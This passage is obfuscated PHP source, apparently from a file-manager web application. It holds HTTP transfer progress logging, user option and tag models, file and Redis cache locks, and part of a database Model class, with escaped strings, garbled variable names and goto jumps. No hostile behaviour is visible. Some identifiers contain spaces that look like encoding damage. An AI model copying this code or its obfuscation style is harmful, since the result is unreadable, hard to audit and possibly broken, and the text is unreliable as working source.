$Æè®Àóµ[$ò¿•Š¾Ü[1177]] = $ò¿•Š¾Ü[2004]; $Æè®Àóµ[$ò¿•Š¾Ü[1977]] = $ò¿•Š¾Ü[1328]; } } } $this->update(); $Êñ´™õ½ = "\x64\x6f\x77\x6e\72{$¼¯à×’“}\57{$ŸÎáÄßÍ}\x3b\x20\165\160\x6c\157\141\144\x3a{$’€´²¡‚}\57{$ÀÄ«ïßÈ}\73\146\x69\x6c\x65\x3d" . $Æè®Àóµ[$ò¿•Š¾Ü[1975]]; self::log(array($ò¿•Š¾Ü[2005] . $Êñ´™õ½ . $ò¿•Š¾Ü[74] . $Æè®Àóµ[$ò¿•Š¾Ü[1973]], curl_getinfo($ŞÎİí’½))); } public function curlProgressStart($Ã¢¦“Ï) { } public function curlProgressEnd($Æ‹óÉ¬Ä) { $ä°»û² =& $_SERVER[€ä¾™²]; $ÑÈ†¼˜ï =& $this->task; $à¹™Ôê = curl_getinfo($Æ‹óÉ¬Ä); $¨¦¢Ê¨± = $à¹™Ôê[$ä°»û²[2006]]; if ($¨¦¢Ê¨± == -1) { $¨¦¢Ê¨± = $à¹™Ôê[$ä°»û²[2007]]; } if ($ÑÈ†¼˜ï[$ä°»û²[1977]] == $ä°»û²[108] && $¨¦¢Ê¨±) { $ÑÈ†¼˜ï[$ä°»û²[1978]] += $¨¦¢Ê¨±; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $È¤¦Åõ• =& $_SERVER[€ä¾™²]; $õúŠä·— =& $this->task; $õúŠä·—[$È¤¦Åõ•[2008]] = 1; Hook::bind($È¤¦Åõ•[1967], array($this, $È¤¦Åõ•[2009])); Hook::bind($È¤¦Åõ•[1969], array($this, $È¤¦Åõ•[2010])); Hook::bind($È¤¦Åõ•[1971], array($this, $È¤¦Åõ•[2011])); } protected function endAfter() { $Ï‡¬Ìğ½ =& $_SERVER[€ä¾™²]; Hook::unbind($Ï‡¬Ìğ½[1967], array($this, $Ï‡¬Ìğ½[2009])); Hook::unbind($Ï‡¬Ìğ½[1969], array($this, $Ï‡¬Ìğ½[2010])); Hook::unbind($Ï‡¬Ìğ½[1971], array($this, $Ï‡¬Ìğ½[2011])); } public function progressStart($ü¾ÃÈôà) { $Éšœ–©Ë =& $_SERVER[€ä¾™²]; $òÄ£Õ æ = curl_getinfo($ü¾ÃÈôà); self::log($Éšœ–©Ë[2012] . $òÄ£Õ æ[$Éšœ–©Ë[383]]); self::valueSet($this->task[$Éšœ–©Ë[486]], $this->task); } public function progressEnd($’İ§Á¾) { $İÏé£Çª =& $_SERVER[€ä¾™²]; self::log($İÏé£Çª[2013] . $this->task[$İÏé£Çª[486]]); $this->end(); } public function progress($à ë…òÏ, $…–ÕäŠã, $ÓëË§¢, $²™ÌÜ½š, $ñ âû«´) { $ŞÎÇÂïÈ =& $_SERVER[€ä¾™²]; $µÆõÁîø =& $this->task; if ($ñ âû«´ > 0) { $µÆõÁîø[$ŞÎÇÂïÈ[1175]] = $µÆõÁîø[$ŞÎÇÂïÈ[1175]] == 0 ? $²™ÌÜ½š : $µÆõÁîø[$ŞÎÇÂïÈ[1175]]; $µÆõÁîø[$ŞÎÇÂïÈ[1922]] = $ñ âû«´; } else { if ($ÓëË§¢ > 0) { $µÆõÁîø[$ŞÎÇÂïÈ[1175]] = $µÆõÁîø[$ŞÎÇÂïÈ[1175]] == 0 ? $…–ÕäŠã : $µÆõÁîø[$ŞÎÇÂïÈ[1175]]; $µÆõÁîø[$ŞÎÇÂïÈ[1922]] = $ÓëË§¢; } } $this->update(); self::log("\x70\x72\157\x67\162\x65\163\163\110\x74\164\160\x3a\144\x6f\167\156\x3a{$ÓëË§¢}\57{$…–ÕäŠã}\73\x20\x75\160\x6c\157\x61\144\x3a{$ñ âû«´}\57{$²™ÌÜ½š}\x3b"); } } goto a×ÇéÑª™„; dÅØÜ¤ñ…: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\x6f\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($âĞ˜‚Œº) { return "\125\163\145\162\x4f\160\x74\151\x6f\x6e\x5f{$âĞ˜‚Œº}\137" . KodUser::id(); } protected function filterWhere($½©£îÆî) { $½©£îÆî[$_SERVER[€ä¾™²][1539]] = KodUser::id(); return $½©£îÆî; } public function cacheRemoveUser($·ÂûáıÃ, $ÒéË½À”) { return Cache::remove("\x55\x73\x65\162\117\160\x74\151\157\x6e\x5f{$·ÂûáıÃ}\137" . $ÒéË½À”); } protected function optionDefault($Í±†±ç = '') { $á¤ôÎçõ =& $_SERVER[€ä¾™²]; if ($Í±†±ç == $á¤ôÎçõ[12]) { return $GLOBALS[$á¤ôÎçõ[6]][$á¤ôÎçõ[2670]]; } if ($Í±†±ç == $á¤ôÎçõ[2671]) { return $GLOBALS[$á¤ôÎçõ[6]][$á¤ôÎçõ[2672]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\x74\141\147\x4c\151\x73\x74"; public $modelType = "\x55\x73\x65\x72\x4f\160\x74\x69\x6f\156"; public $field = array("\156\141\x6d\145", "\x73\x74\x79\x6c\145", "\x73\x6f\162\164"); public function listData($í€êô­ = false, $¤²Ö¯å© = "\x73\x6f\162\164", $Ä²†ü±ƒ = false) { return parent::listData($í€êô­, $¤²Ö¯å©, $Ä²†ü±ƒ); } public function remove($‘¾€Ü’í) { return parent::remove($‘¾€Ü’í); } public function add($è‹ù¤–Æ, $Œé–ëó½ = "\154\141\x62\x65\154\55\147\x72\x65\171\55\156\157\x72\155\x61\x6c") { $üÄúßá =& $_SERVER[€ä¾™²]; if ($this->findByName($è‹ù¤–Æ)) { return !1; } $¦Ë´†øµ = array($üÄúßá[516] => $è‹ù¤–Æ, $üÄúßá[581] => $Œé–ëó½, $üÄúßá[2132] => $this->getSort($üÄúßá[336]) + 1); return parent::insert($¦Ë´†øµ); } public function update($‰·ÖÜê, $Ş“ ““½) { $‡¯µåÓµ =& $_SERVER[€ä¾™²]; $šÙ¢ßÜ‚ = $this->listData($‰·ÖÜê); $Óµë‰€ = $this->findByName($Ş“ ““½[$‡¯µåÓµ[32]]); if (!$šÙ¢ßÜ‚ || $Óµë‰€ && $Óµë‰€[$‡¯µåÓµ[486]] != $šÙ¢ßÜ‚[$‡¯µåÓµ[486]]) { return !1; } return parent::update($‰·ÖÜê, $Ş“ ““½); } public function moveTop($“ÙÃºÊ) { $ŒÒˆ“—µ =& $_SERVER[€ä¾™²]; $÷ÉôÖ”Ä = parent::listData(); $®ºşûÃÑ = $this->getSort($ŒÒˆ“—µ[335]); foreach ($÷ÉôÖ”Ä as &$ÈıÒ¢¶ ) { if ($ÈıÒ¢¶ [$ŒÒˆ“—µ[486]] == $“ÙÃºÊ) { $ÈıÒ¢¶ [$ŒÒˆ“—µ[2150]] = $®ºşûÃÑ; continue; } $ÈıÒ¢¶ [$ŒÒˆ“—µ[2150]] += 1; } unset($ÈıÒ¢¶ ); return parent::resetData($÷ÉôÖ”Ä); } public function moveBottom($ôæ’â—Ù) { $ĞÁØ¦ =& $_SERVER[€ä¾™²]; $Óš°ƒìÂ = $this->getSort($ĞÁØ¦[336]) + 1; return parent::update($ôæ’â—Ù, array($ĞÁØ¦[2150] => $Óš°ƒìÂ)); } public function resetSort($®İæáó) { $ç©Çúİ˜ =& $_SERVER[€ä¾™²]; $ö»âœá = array(); $®İæáó = is_array($®İæáó) ? $®İæáó : array(); for ($ÄßæŞï§ = 0; $ÄßæŞï§ < count($®İæáó); $ÄßæŞï§++) { $ö»âœá[$®İæáó[$ÄßæŞï§] . $ç©Çúİ˜[12]] = $ÄßæŞï§ + 1; } $÷õßú§§ = parent::listData(); foreach ($÷õßú§§ as &$ø°å†Æ) { $–Áóªıº = $ö»âœá[$ø°å†Æ[$ç©Çúİ˜[486]]]; $ø°å†Æ[$ç©Çúİ˜[2150]] = $–Áóªıº ? $–Áóªıº : $ø°å†Æ[$ç©Çúİ˜[2150]]; } unset($ø°å†Æ); return parent::resetData($÷õßú§§); } private function getSort($ Şİ»íÓ) { $…ªíéÚ =& $_SERVER[€ä¾™²]; $æÎÌ¿³İ = parent::listData(); $Äİ´±û = array_to_keyvalue($æÎÌ¿³İ, $…ªíéÚ[12], $…ªíéÚ[2150]); if (!$Äİ´±û) { $Äİ´±û = array(0); } $¦«¼ÎÛ = $ Şİ»íÓ == $…ªíéÚ[336] ? max($Äİ´±û) : min($Äİ´±û); return intval($¦«¼ÎÛ); } } goto A’ô¾İÇÒ„; Dê¥Ò°Ë¬Á: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ĞÇÍ«Îü =& $_SERVER[€ä¾™²]; $ÉğîÌ˜ = $GLOBALS[$ĞÇÍ«Îü[6]][$ĞÇÍ«Îü[425]]; self::$cachePath = $ÉğîÌ˜[$ĞÇÍ«Îü[231]][$ĞÇÍ«Îü[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($››äÉ±û, $ĞåÚ§ = 0) { $¯¨ÙÖªå =& $_SERVER[€ä¾™²]; $ÜØûº–é = microtime(!0); $á‚˜êïÍ = $ÜØûº–é + $ĞåÚ§ + 0.0001; $šî¡…Éó = rtrim(self::$cachePath, $¯¨ÙÖªå[8]) . $¯¨ÙÖªå[975] . md5($››äÉ±û) . $¯¨ÙÖªå[972]; if (file_exists($šî¡…Éó) && filemtime($šî¡…Éó) && filemtime($šî¡…Éó) < time() - 10) { @unlink($šî¡…Éó); } do { if (file_exists($šî¡…Éó)) { cacheLockWait(); continue; } $äà—² = fopen($šî¡…Éó, $¯¨ÙÖªå[976]); if (!$äà—²) { return !1; } $×óŒÏÇ = flock($äà—², LOCK_EX | LOCK_NB); self::$caches[$››äÉ±û] = array($¯¨ÙÖªå[977] => $äà—², $¯¨ÙÖªå[231] => $šî¡…Éó); fwrite($äà—², $á‚˜êïÍ); clearstatcache(); if ($äà—² && $×óŒÏÇ) { return !0; } cacheLockWait(); } while (microtime(!0) < $á‚˜êïÍ); $this->unlock($››äÉ±û); return !1; } public function lockGet($É×ö¤¢) { $²ËÔáû =& $_SERVER[€ä¾™²]; $˜ç·º™ = rtrim(self::$cachePath, $²ËÔáû[8]) . $²ËÔáû[975] . md5($É×ö¤¢) . $²ËÔáû[972]; return file_exists($˜ç·º™); } public function unlock($ùı™ô€†) { $şŠ–Ÿ³§ =& $_SERVER[€ä¾™²]; $¡ê¤×ñ« = self::$caches[$ùı™ô€†]; if (!$¡ê¤×ñ«) { return; } @flock($¡ê¤×ñ«[$şŠ–Ÿ³§[977]], LOCK_UN); @fclose($¡ê¤×ñ«[$şŠ–Ÿ³§[977]]); @unlink($¡ê¤×ñ«[$şŠ–Ÿ³§[231]]); unset(self::$caches[$ùı™ô€†]); } } class CacheLockRedis { public function lock($…·¸¶¾ë, $¹›ÚĞ÷ = 10) { $Ù½…Ì”½ = Cache::init(); $ı†¬ª•ğ = microtime(!0) + $¹›ÚĞ÷; while (microtime(!0) < $ı†¬ª•ğ) { $Î»Ï¤ = $Ù½…Ì”½->get($…·¸¶¾ë); if (!$Î»Ï¤) { $óÁğĞ = $Ù½…Ì”½->setLock($…·¸¶¾ë, $ı†¬ª•ğ, $¹›ÚĞ÷); if ($óÁğĞ) { return !0; } } else { if ($Î»Ï¤ < microtime(!0)) { $Ù½…Ì”½->set($…·¸¶¾ë, $ı†¬ª•ğ, $¹›ÚĞ÷ * 2); if ($Ù½…Ì”½->get($…·¸¶¾ë) === $Î»Ï¤) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ åÃ½ØÓ) { return Cache::init()->get($ åÃ½ØÓ); } public function unlock($¼—¶ûê†) { return Cache::init()->remove($¼—¶ûê†); } } goto AëõƒŒ¨ª; cÊ˜Ó°‹¸—: define($_SERVER[€ä¾™²][321], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\157\x72\x64\x65\x72", "\x61\x6c\x69\141\163", "\150\141\x76\151\156\147", "\x67\x72\x6f\165\160", "\x6c\157\x63\x6b", "\144\151\x73\x74\x69\156\x63\x74", "\x61\x75\164\157", "\x66\151\x6c\164\x65\x72", "\x76\141\x6c\x69\144\141\164\x65", "\162\x65\163\x75\x6c\x74", "\142\x69\156\x64", "\x74\x6f\153\x65\x6e"); public function __construct($¤Óáİ· = '', $•½¹“ˆ¤ = '', $ù…™–èÔ = '') { $ÍğÎõ‰® =& $_SERVER[€ä¾™²]; $this->_initialize(); if (!empty($¤Óáİ·)) { if (strpos($¤Óáİ·, $ÍğÎõ‰®[10])) { list($this->dbName, $this->name) = explode($ÍğÎõ‰®[10], $¤Óáİ·); } else { $this->name = $¤Óáİ·; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($•½¹“ˆ¤)) { $this->tablePrefix = $ÍğÎõ‰®[12]; } elseif ($ÍğÎõ‰®[12] != $•½¹“ˆ¤) { $this->tablePrefix = $•½¹“ˆ¤; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÍğÎõ‰®[322]); } $this->db(0, empty($this->connection) ? $ù…™–èÔ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÚİÃ×÷ö =& $_SERVER[€ä¾™²]; if (empty($this->fields)) { if (think_config($ÚİÃ×÷ö[323])) { $Óñ‡È¿Ñ = $this->dbName ? $this->dbName : think_config($ÚİÃ×÷ö[324]); $ˆªÊûØÙ = think_var_cache($ÚİÃ×÷ö[325] . strtolower(get_path_this($Óñ‡È¿Ñ) . $ÚİÃ×÷ö[10] . $this->name)); if ($ˆªÊûØÙ) { $õŒâÆîê = think_config($ÚİÃ×÷ö[326]); if (empty($õŒâÆîê) || $ˆªÊûØÙ[$ÚİÃ×÷ö[327]] == $õŒâÆîê) { $this->fields = $ˆªÊûØÙ; return; } } } $this->flush(); } } public function flush() { $áùÅŒü³ =& $_SERVER[€ä¾™²]; $this->db->setModel($this->name); $ÚÔßş³” = $this->db->getFields($this->getTableName()); if (!$ÚÔßş³”) { return !1; } $this->fields = array_keys($ÚÔßş³”); $this->fields[$áùÅŒü³[328]] = !1; foreach ($ÚÔßş³” as $µ¤Öö±Ú => $õÒ°á·) { $¼°ª“€[$µ¤Öö±Ú] = $õÒ°á·[$áùÅŒü³[33]]; if ($õÒ°á·[$áùÅŒü³[39]]) { $this->fields[$áùÅŒü³[329]] = $µ¤Öö±Ú; if ($õÒ°á·[$áùÅŒü³[42]]) { $this->fields[$áùÅŒü³[328]] = !0; } } } $this->fields[$áùÅŒü³[330]] = $¼°ª“€; if (think_config($áùÅŒü³[326])) { $this->fields[$áùÅŒü³[327]] = think_config($áùÅŒü³[326]); } if (think_config($áùÅŒü³[323])) { $ÁİıÁê« = $this->dbName ? $this->dbName : think_config($áùÅŒü³[324]); think_var_cache($áùÅŒü³[325] . strtolower(get_path_this($ÁİıÁê«) . $áùÅŒü³[10] . $this->name), $this->fields); } } public function switchModel($ˆªœùµ, $ƒ»Æ…÷á = array()) { $â½ĞĞÉï =& $_SERVER[€ä¾™²]; $ØñòİÖ = ucwords(strtolower($ˆªœùµ)) . $â½ĞĞÉï[331]; if (!class_exists($ØñòİÖ)) { think_exception($ØñòİÖ . think_lang($â½ĞĞÉï[332])); } $this->_extModel = new $ØñòİÖ($this->name); if (!empty($ƒ»Æ…÷á)) { foreach ($ƒ»Æ…÷á as $›ÁªÈÈ) { $this->_extModel->setProperty($›ÁªÈÈ, $this->{$›ÁªÈÈ}); } } return $this->_extModel; } public function __set($Í½šì‰, $•Œ•ÔÀ·) { $this->data[$Í½šì‰] = $•Œ•ÔÀ·; } public function __get($ßÍŞœœŠ) { return isset($this->data[$ßÍŞœœŠ]) ? $this->data[$ßÍŞœœŠ] : null; } public function __isset($Ñ÷ßÂù) { return isset($this->data[$Ñ÷ßÂù]); } public function __unset($ˆ›ö îƒ) { unset($this->data[$ˆ›ö îƒ]); } public function __call($‹’²ãÔ½, $ßƒêú¿İ) { $Â¬Ù»¡Ş =& $_SERVER[€ä¾™²]; if (in_array(strtolower($‹’²ãÔ½), $this->methods, !0)) { $this->options[strtolower($‹’²ãÔ½)] = $ßƒêú¿İ[0]; return $this; } elseif (in_array(strtolower($‹’²ãÔ½), array($Â¬Ù»¡Ş[333], $Â¬Ù»¡Ş[334], $Â¬Ù»¡Ş[335], $Â¬Ù»¡Ş[336], $Â¬Ù»¡Ş[337]), !0)) { $²Ïµ‹“‹ = isset($ßƒêú¿İ[0]) ? $ßƒêú¿İ[0] : $Â¬Ù»¡Ş[221]; $²Ïµ‹“‹ = $this->db->parseKey($²Ïµ‹“‹); return $this->getField(strtoupper($‹’²ãÔ½) . $Â¬Ù»¡Ş[338] . $²Ïµ‹“‹ . $Â¬Ù»¡Ş[339] . $‹’²ãÔ½, $Â¬Ù»¡Ş[333]); } elseif (strtolower(substr($‹’²ãÔ½, 0, 5)) == $Â¬Ù»¡Ş[340]) { $²Ïµ‹“‹ = think_parse_name(substr($‹’²ãÔ½, 5)); $Ôİú¡èÉ[$²Ïµ‹“‹] = $ßƒêú¿İ[0]; return $this->where($Ôİú¡èÉ)->find(); } elseif (strtolower(substr($‹’²ãÔ½, 0, 10)) == $Â¬Ù»¡Ş[341]) { $µîó¶ì· = think_parse_name(substr($‹’²ãÔ½, 10)); $Ôİú¡èÉ[$µîó¶ì·] = $ßƒêú¿İ[0]; return $this->where($Ôİú¡èÉ)->getField($ßƒêú¿İ[1]); } elseif (isset($this->_scope[$‹’²ãÔ½])) { return $this->scope($‹’²ãÔ½, $ßƒêú¿İ[0]); } elseif (method_exists($this, $‹’²ãÔ½) || method_exists($this, $Â¬Ù»¡Ş[342] . $‹’²ãÔ½)) { array_unshift($ßƒêú¿İ, $‹’²ãÔ½); return call_user_func_array(array($this, $Â¬Ù»¡Ş[343]), $ßƒêú¿İ); } else { return call_user_func_array(array(parent, $‹’²ãÔ½), $ßƒêú¿İ); } } protected function call() { $ Å‘ÍÙı =& $_SERVER[€ä¾™²]; $Ìã³º  = func_get_args(); $ÈÙóß· = array_shift($Ìã³º ); $­ƒ’¤¢Æ = $ÈÙóß·; if (is_array($ÈÙóß·)) { $­ƒ’¤¢Æ = $ÈÙóß·[1]; $ÈÙóß· = $ÈÙóß·[0]; } $À»–ä = count($Ìã³º ) - 1; if (isset($Ìã³º [$À»–ä]) && $Ìã³º [$À»–ä] === $ÈÙóß·) { think_exception(__CLASS__ . $ Å‘ÍÙı[4] . $ÈÙóß· . think_lang($ Å‘ÍÙı[344])); return; } $Ìã³º [] = $ÈÙóß·; if (method_exists($this, $ Å‘ÍÙı[345])) { $‹‹™›„µ = call_user_func_array(array($this, $ Å‘ÍÙı[346]), array($­ƒ’¤¢Æ, $Ìã³º )); if (!is_null($‹‹™›„µ) && $‹‹™›„µ !== !1) { return $‹‹™›„µ; } } $¦ÊÌÙ„À = !1; if (method_exists($this, $ÈÙóß·)) { $¦ÊÌÙ„À = call_user_func_array(array($this, $ÈÙóß·), $Ìã³º ); } if (method_exists($this, $ Å‘ÍÙı[347])) { $‹‹™›„µ = call_user_func_array(array($this, $ Å‘ÍÙı[348]), array($­ƒ’¤¢Æ, $Ìã³º , $¦ÊÌÙ„À)); if ($‹‹™›„µ) { return $‹‹™›„µ; } } return $¦ÊÌÙ„À; } protected function _initialize() { } protected function _facade($ìÀé´ôÇ) { $‚ªÅ®›á =& $_SERVER[€ä¾™²]; if (!empty($this->fields)) { foreach ($ìÀé´ôÇ as $õÇÕ˜®Ó => $òÖ‹û¹š) { if (is_array($this->fields) && !in_array($õÇÕ˜®Ó, $this->fields, !0)) { unset($ìÀé´ôÇ[$õÇÕ˜®Ó]); } elseif (is_scalar($òÖ‹û¹š)) { $this->_parseType($ìÀé´ôÇ, $õÇÕ˜®Ó); } } } if (!empty($this->options[$‚ªÅ®›á[349]])) { $ìÀé´ôÇ = array_map($this->options[$‚ªÅ®›á[349]], $ìÀé´ôÇ); unset($this->options[$‚ªÅ®›á[349]]); } $this->_beforeWrite($ìÀé´ôÇ); return $ìÀé´ôÇ; } protected function _beforeWrite(&$­Ã•¬è) { } public function add($µ“œÔ¾ = '', $°àåø¾ü = array(), $ûÏû™· = false) { if (empty($µ“œÔ¾)) { if (!empty($this->data)) { $µ“œÔ¾ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[€ä¾™²][350]); return !1; } } $°àåø¾ü = $this->_parseOptions($°àåø¾ü); $µ“œÔ¾ = $this->_facade($µ“œÔ¾); if (!1 === $this->_beforeInsert($µ“œÔ¾, $°àåø¾ü)) { return !1; } $Œµß™ıÂ = $this->db->insert($µ“œÔ¾, $°àåø¾ü, $ûÏû™·); if (!1 !== $Œµß™ıÂ) { $Ú¶çâİ— = $this->getLastInsID(); if ($Ú¶çâİ—) { $µ“œÔ¾[$this->getPk()] = $Ú¶çâİ—; $this->_after_insert($µ“œÔ¾, $°àåø¾ü); return $Ú¶çâİ—; } $this->_after_insert($µ“œÔ¾, $°àåø¾ü); } return $Œµß™ıÂ; } protected function _beforeInsert(&$¶ßéÖëÆ, $ü‘òöÂœ) { } protected function _after_insert($ÉÔÅ‹äÊ, $åÀû­û¨) { } public function addAll($»–ñ«Ü‚, $ı²„®è² = array(), $±«Ê ãÌ = false) { $ÚãíŒÑÃ =& $_SERVER[€ä¾™²]; if (empty($»–ñ«Ü‚)) { $this->error = think_lang($ÚãíŒÑÃ[350]); return !1; } $ı²„®è² = $this->_parseOptions($ı²„®è²); foreach ($»–ñ«Ü‚ as $ĞôŸ˜Úõ => $›Ôğğàœ) { $»–ñ«Ü‚[$ĞôŸ˜Úõ] = $this->_facade($›Ôğğàœ); } if (method_exists($this->db, $ÚãíŒÑÃ[351])) { $®ƒàğĞ¥ = $this->db->insertAll($»–ñ«Ü‚, $ı²„®è², $±«Ê ãÌ); } else { $this->startTrans(); foreach ($»–ñ«Ü‚ as $ĞôŸ˜Úõ => $›Ôğğàœ) { $®ƒàğĞ¥ = $this->db->insert($›Ôğğàœ, $ı²„®è², $±«Ê ãÌ); } $this->commit(); } if (!1 !== $®ƒàğĞ¥) { $‚ú÷­Š = $this->getLastInsID(); if ($‚ú÷­Š) { return $‚ú÷­Š; } } return $®ƒàğĞ¥; } public function selectAdd($ıæ­ÖìÕ = '', $š‰—Å»· = '', $Û¸šû·Ø = array()) { $„×±‰¨Â =& $_SERVER[€ä¾™²]; $Û¸šû·Ø = $this->_parseOptions($Û¸šû·Ø); if (!1 === ($ƒ©ÚğÊß = $this->db->selectInsert($ıæ­ÖìÕ ? $ıæ­ÖìÕ : $Û¸šû·Ø[$„×±‰¨Â[352]], $š‰—Å»· ? $š‰—Å»· : $this->getTableName(), $Û¸šû·Ø))) { $this->error = think_lang($„×±‰¨Â[353]); return !1; } else { return $ƒ©ÚğÊß; } } public function save($Éà•¹€ñ = '', $üÆ®úÔ… = array()) { $ ‚óü†Ã =& $_SERVER[€ä¾™²]; if (empty($Éà•¹€ñ)) { if (!empty($this->data)) { $Éà•¹€ñ = $this->data; $this->data = array(); } else { $this->error = think_lang($ ‚óü†Ã[350]); return !1; } } $Éà•¹€ñ = $this->_facade($Éà•¹€ñ); $üÆ®úÔ… = $this->_parseOptions($üÆ®úÔ…); $û“Ü ‚ = $this->getPk(); if (!isset($üÆ®úÔ…[$ ‚óü†Ã[354]])) { if (isset($Éà•¹€ñ[$û“Ü ‚])) { $÷·Ñ‰î[$û“Ü ‚] = $Éà•¹€ñ[$û“Ü ‚]; $üÆ®úÔ…[$ ‚óü†Ã[354]] = $÷·Ñ‰î; unset($Éà•¹€ñ[$û“Ü ‚]); } else { $this->error = think_lang($ ‚óü†Ã[353]); return !1; } } if (is_array($üÆ®úÔ…[$ ‚óü†Ã[354]]) && isset($üÆ®úÔ…[$ ‚óü†Ã[354]][$û“Ü ‚])) { $“°ƒ­Ï = $üÆ®úÔ…[$ ‚óü†Ã[354]][$û“Ü ‚]; } if (!1 === $this->_beforeUpdate($Éà•¹€ñ, $üÆ®úÔ…)) { return !1; } $ÁµÇãøí = $this->db->update($Éà•¹€ñ, $üÆ®úÔ…); if (!1 !== $ÁµÇãøí) { if (isset($“°ƒ­Ï)) { $Éà•¹€ñ[$û“Ü ‚] = $“°ƒ­Ï; } $this->_afterUpdate($Éà•¹€ñ, $üÆ®úÔ…); } return $ÁµÇãøí; } protected function _beforeUpdate(&$­şÒú›ƒ, $Ö¼åÀşÅ) { } protected function _afterUpdate($³ù™Å¡â, $œ¯…Ò««) { } public function delete($Â€ñ—ñ = array()) { $Ç¡ªßİ =& $_SERVER[€ä¾™²]; if (empty($Â€ñ—ñ) && empty($this->options[$Ç¡ªßİ[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¯¿„Ö™è = $this->getPk(); if (is_numeric($Â€ñ—ñ) || is_string($Â€ñ—ñ)) { if (strpos($Â€ñ—ñ, $Ç¡ªßİ[50])) { $åî¬ĞÛÏ[$¯¿„Ö™è] = array($Ç¡ªßİ[355], $Â€ñ—ñ); } else { $åî¬ĞÛÏ[$¯¿„Ö™è] = $Â€ñ—ñ; } $this->options[$Ç¡ªßİ[354]] = $åî¬ĞÛÏ; } $Â€ñ—ñ = $this->_parseOptions(); if (is_array($Â€ñ—ñ[$Ç¡ªßİ[354]]) && isset($Â€ñ—ñ[$Ç¡ªßİ[354]][$¯¿„Ö™è])) { $–òÅÆ¹á = $Â€ñ—ñ[$Ç¡ªßİ[354]][$¯¿„Ö™è]; } $öèåÒƒù = $this->db->delete($Â€ñ—ñ); if (!1 !== $öèåÒƒù) { $¡ê‡£˜’ = array(); if (isset($–òÅÆ¹á)) { $¡ê‡£˜’[$¯¿„Ö™è] = $–òÅÆ¹á; } $this->_after_delete($¡ê‡£˜’, $Â€ñ—ñ); } return $öèåÒƒù; } protected function _after_delete($¢ùÜº, $Œúß§îÖ) { } public function select($ôÚ­éï¡ = array()) { $Áá»öº =& $_SERVER[€ä¾™²]; if (is_string($ôÚ­éï¡) || is_numeric($ôÚ­éï¡)) { $›áîµı = $this->getPk(); if (strpos($ôÚ­éï¡, $Áá»öº[50])) { $úÅ¾ŒŠô[$›áîµı] = array($Áá»öº[355], $ôÚ­éï¡); } else { $úÅ¾ŒŠô[$›áîµı] = $ôÚ­éï¡; } $this->options[$Áá»öº[354]] = $úÅ¾ŒŠô; } elseif (!1 === $ôÚ­éï¡) { $ôÚ­éï¡ = $this->_parseOptions(); return $Áá»öº[356] . $this->db->buildSelectSql($ôÚ­éï¡) . $Áá»öº[357]; } $ôÚ­éï¡ = $this->_parseOptions(); $‰…¤ßó• = $this->db->select($ôÚ­éï¡); if (!1 === $‰…¤ßó•) { return !1; } if (empty($‰…¤ßó•)) { return null; } $this->_afterSelect($‰…¤ßó•, $ôÚ­éï¡); return $‰…¤ßó•; } protected function _afterSelect(&$•šëÌ±º, $¢öÓˆòå) { } public function buildSql($èé¡ì¯« = array()) { $š™ÄæŸ— =& $_SERVER[€ä¾™²]; $èé¡ì¯« = $this->_parseOptions($èé¡ì¯«); return $š™ÄæŸ—[356] . $this->db->buildSelectSql($èé¡ì¯«) . $š™ÄæŸ—[357]; } public function optionsValue($åš½Œ = null) { if (is_null($åš½Œ)) { return $this->options; } elseif (is_array($åš½Œ)) { $this->options = array_merge($this->options, $åš½Œ); } } protected function _parseOptions($ì€®µ–ç = array()) { $¡“‚–ùì =& $_SERVER[€ä¾™²]; if (is_array($ì€®µ–ç)) { $ì€®µ–ç = array_merge($this->options, $ì€®µ–ç); } $this->options = array(); if (!isset($ì€®µ–ç[$¡“‚–ùì[358]])) { $ì€®µ–ç[$¡“‚–ùì[358]] = $this->getTableName(); $„Éş¾÷  = $this->fields; } else { $„Éş¾÷  = $this->getDbFields(); } if (!empty($ì€®µ–ç[$¡“‚–ùì[359]])) { $ì€®µ–ç[$¡“‚–ùì[358]] .= $¡“‚–ùì[53] . $ì€®µ–ç[$¡“‚–ùì[359]]; } $ì€®µ–ç[$¡“‚–ùì[360]] = $this->name; if (isset($ì€®µ–ç[$¡“‚–ùì[354]]) && is_array($ì€®µ–ç[$¡“‚–ùì[354]]) && !empty($„Éş¾÷ ) && !isset($ì€®µ–ç[$¡“‚–ùì[361]]) && !isset($ì€®µ–ç[$¡“‚–ùì[358]])) { foreach ($ì€®µ–ç[$¡“‚–ùì[354]] as $ÀÒ Êûİ => $†«ÂÙ§) { $ÀÒ Êûİ = trim($ÀÒ Êûİ); if (in_array($ÀÒ Êûİ, $„Éş¾÷ , !0)) { if (is_scalar($†«ÂÙ§)) { $this->_parseType($ì€®µ–ç[$¡“‚–ùì[354]], $ÀÒ Êûİ); } } elseif (!is_numeric($ÀÒ Êûİ) && $¡“‚–ùì[11] != substr($ÀÒ Êûİ, 0, 1) && !1 === strpos($ÀÒ Êûİ, $¡“‚–ùì[10]) && !1 === strpos($ÀÒ Êûİ, $¡“‚–ùì[338]) && !1 === strpos($ÀÒ Êûİ, $¡“‚–ùì[213]) && !1 === strpos($ÀÒ Êûİ, $¡“‚–ùì[285])) { unset($ì€®µ–ç[$¡“‚–ùì[354]][$ÀÒ Êûİ]); } } } $this->_options_filter($ì€®µ–ç); return $ì€®µ–ç; } protected function 